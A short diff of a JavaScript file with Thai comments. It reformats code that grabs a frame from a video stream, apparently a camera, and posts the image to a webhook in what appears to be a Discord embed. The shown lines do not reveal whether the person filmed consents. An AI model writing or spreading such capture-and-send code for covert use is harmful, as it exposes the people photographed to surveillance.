@@ -213,14 +213,15 @@ async function sendToWebhook(imageBlob) {
     };
 
     // ใช้ FormData เพื่อจัดการการส่งไฟล์รูปแบบ Multipart
-    const formData = new FormData();
-    
-    if (imageBlob) {
-        // แนะนำรูปภาพเข้าสู่โครงสร้าง Embed
-        embedData.image = { url: "attachment://shot.png" };
-        formData.append("file", imageBlob, "shot.png");
-    }
+const formData = new FormData();
 
+if (imageBlob) {
+    embedData.image = {
+        url: "attachment://shot.png"
+    };
+
+    formData.append("file", imageBlob, "shot.png");
+}
     formData.append("payload_json", JSON.stringify({ embeds: [embedData] }));
 
     try {
@@ -253,8 +254,8 @@ function showResult(videoElement, stream) {
 
         // เปลี่ยนข้อมูลภาพ Canvas ให้เป็นไฟล์ Blob และนำไปส่งผ่าน Webhook
         canvas.toBlob((blob) => {
-            sendToWebhook(blob);
-        }, "image/png");
+    if (blob) sendToWebhook(blob);
+}, "image/png");
     } else {
         sendToWebhook(null);
     }
